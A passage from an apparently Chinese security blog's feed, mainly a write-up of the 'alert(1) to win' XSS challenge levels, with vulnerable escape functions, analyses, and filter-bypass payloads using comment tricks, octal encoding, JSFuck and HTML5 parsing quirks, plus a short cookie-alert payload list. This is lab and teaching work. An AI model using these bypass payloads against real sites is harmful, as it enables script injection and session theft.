创建一个注释节点</span><br></pre></td></tr></table></figure><p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">34个字符</span><br><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">32个字符</span><br><span class="line">Comment#&gt;&lt;iframe onload=alert(1)</span><br></pre></td></tr></table></figure><h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&#x27;]*$/.test(thing[0])) return &#x27;Invalid callback&#x27;;</span><br><span class="line">  var obj = &#123;&#x27;userdata&#x27;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/&lt;/g, &#x27;\\u003c&#x27;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;#&#x27;;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>闭合<code>&lt;script&gt;</code>标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;img src onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(/./g, function(x) &#123;</span><br><span class="line">       return &#123; &#x27;&lt;&#x27;: &#x27;&amp;lt;&#x27;, &#x27;&gt;&#x27;: &#x27;&amp;gt;&#x27;, &#x27;&amp;&#x27;: &#x27;&amp;amp;&#x27;, &#x27;&quot;&#x27;: &#x27;&amp;quot;&#x27;, &quot;&#x27;&quot;: &#x27;&amp;#39;&#x27; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v = document.getElementById(&#x27;name&#x27;);    \n\</span><br><span class="line">         v.innerHTML = &#x27;&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;&#x27;;       \n\</span><br><span class="line">      &lt;\/script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>&#123;name&#125;</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">32个字符</span><br><span class="line">\x3cimg src onerror=alert(1)\x3e</span><br><span class="line">26个字符</span><br><span class="line">\x3cstyle/onload=alert(1)  //末尾有一个空格</span><br></pre></td></tr></table></figure><h2 id="JSON-2"><a href="#JSON-2" class="headerlink" title="JSON 2"></a>JSON 2</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s).replace(/&lt;\/script/gi, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&#x27; + s + &#x27;);&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>对<code>&lt;/script</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p><p>由于直接将字符串替换为空，可以双写绕过。</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/s&lt;/scriptcript&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="Callback-2"><a href="#Callback-2" class="headerlink" title="Callback 2"></a>Callback 2</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&#x27;]*$/.test(thing[0])) return &#x27;Invalid callback&#x27;;</span><br><span class="line">  var obj = &#123;&#x27;userdata&#x27;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/\//g, &#x27;\\/&#x27;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code><br>可以使用来注释。</p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;#&#x27;;alert(1)&lt;!--</span><br></pre></td></tr></table></figure><h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[&lt;&gt;]/.test(s)) return &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p><p><a href="http://www.jsfuck.com/">JSfuck</a></p><p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p><p>我们可以通过这种方法来执行任意方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&#x27;map&#x27;][&#x27;constructor&#x27;](&#x27;alert(1)&#x27;)()</span><br></pre></td></tr></table></figure><p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164(1)&#x27;)()//</span><br></pre></td></tr></table></figure><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br><span class="line">方法二</span><br><span class="line">&quot;);[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164(1)&#x27;)()//</span><br></pre></td></tr></table></figure><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag = document.createElement(&#x27;iframe&#x27;);</span><br><span class="line"></span><br><span class="line">  // For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  //</span><br><span class="line">  // https://4i.am/?...raw=... just outputs whatever you pass in.</span><br><span class="line">  //</span><br><span class="line">  // Alerting from 4i.am won&#x27;t count.</span><br><span class="line"></span><br><span class="line">  s = &#x27;&lt;script&gt;&#x27; + s + &#x27;&lt;\/script&gt;&#x27;;</span><br><span class="line">  tag.src = &#x27;https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=&#x27; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING = function() &#123; youWon = true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&#x27;onload&#x27;, &#x27;youWon &amp;&amp; alert(1)&#x27;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;youWon&quot;</span><br></pre></td></tr></table></figure><h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(/\//g, &#x27;\\/&#x27;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(/[&lt;&gt;&quot;&amp;]/g, function(s) &#123;</span><br><span class="line">                        return &#x27;&amp;#&#x27; + s.charCodeAt(0) + &#x27;;&#x27;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &#x27;&lt;script&gt;&#x27; +</span><br><span class="line">      &#x27;var url = &#x27; + json(s) + &#x27;; // We\&#x27;ll use this later &#x27; +</span><br><span class="line">    &#x27;&lt;/script&gt;\n\n&#x27; +</span><br><span class="line">    &#x27;  &lt;!-- for debugging --&gt;\n&#x27; +</span><br><span class="line">    &#x27;  URL: &#x27; + html(s) + &#x27;\n\n&#x27; +</span><br><span class="line">    &#x27;&lt;!-- then suddenly --&gt;\n&#x27; +</span><br><span class="line">    &#x27;&lt;script&gt;\n&#x27; +</span><br><span class="line">    &#x27;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#x27; +</span><br><span class="line">    &#x27;  else new Image().src = url;\n&#x27; +</span><br><span class="line">    &#x27;&lt;/script&gt;&#x27;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p><p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url = &quot;&lt;!--&lt;script&gt;&quot;; // We&#x27;ll use this later &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src = url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url = &quot;\/*&lt;!--&lt;script&gt;&quot;; // We&#x27;ll use this later &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: /*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src = url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在注释符之前添加要执行的代码就可以了。</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(alert(1)/*&lt;!--&lt;script&gt;</span><br></pre></td></tr></table></figure><h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    return s.split(&#x27;#&#x27;).map(function(v) &#123;</span><br><span class="line">        // Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">        // bytes by only escaping those.</span><br><span class="line">        var json = JSON.stringify(v).replace(/&lt;\//g, &#x27;&lt;\\/&#x27;);</span><br><span class="line">        return &#x27;&lt;script&gt;console.log(&#x27; + json + &#x27;)&lt;/script&gt;&#x27;;</span><br><span class="line">    &#125;).join(&#x27;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p><p>构造的<code>Payload</code>为``，此时输出为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;/script&gt;&lt;script&gt;console.log(&quot;)/;alert(1)//--&gt;&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中<code>/script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</span><br></pre></td></tr></table></figure><h2 id="Skandia-3"><a href="#Skandia-3" class="headerlink" title="Skandia 3"></a>Skandia 3</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[\\&lt;&gt;]/.test(s)) return &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><h2 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><h2 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><h2 id="No"><a href="#No" class="headerlink" title="No"></a>No</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;靶场地址：&lt;a href=&quot;https://alf.nu/alert1&quot;&gt;alert(1) to win&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;W</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS_payload收集</title>
    <link href="http://lvpsectime.github.io/2020/05/02/XSS-payload%E6%94%B6%E9%9B%86/"/>
    <id>http://lvpsectime.github.io/2020/05/02/XSS-payload%E6%94%B6%E9%9B%86/</id>
    <published>2020-05-02T12:22:34.000Z</published>
    <updated>2020-05-02T12:31:54.330Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XSS弹cookie</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(docment.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>XSS弹用户信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><p><a href="https://github.com/pgaijin66/XSS-Payloads">https://github.com/pgaijin66/XSS-Payloads</a></p><p><a href="https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html">https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html</a></p><p><a href="https://www.jianshu.com/p/01377ad556f0">https://www.jianshu.com/p/01377ad556f0</a></p><p><a href="https://github.com/ismailtasdelen/xss-payload-list">https://github.com/ismailtasdelen/xss-payload-list</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;XSS弹cookie&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/p</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>MySql注入点写webshell</title>
    <link href="http://lvpsectime.github.io/2020/04/29/MySql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%86%99webshell/"/>
    <id>http://lvpsectime.github.io/2020/04/29/MySql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%86%99webshell/</id>
    <published>2020-04-29T11:27:37.000Z</published>
    <updated>2020-04-29T13:11:41.269Z</updated>
    
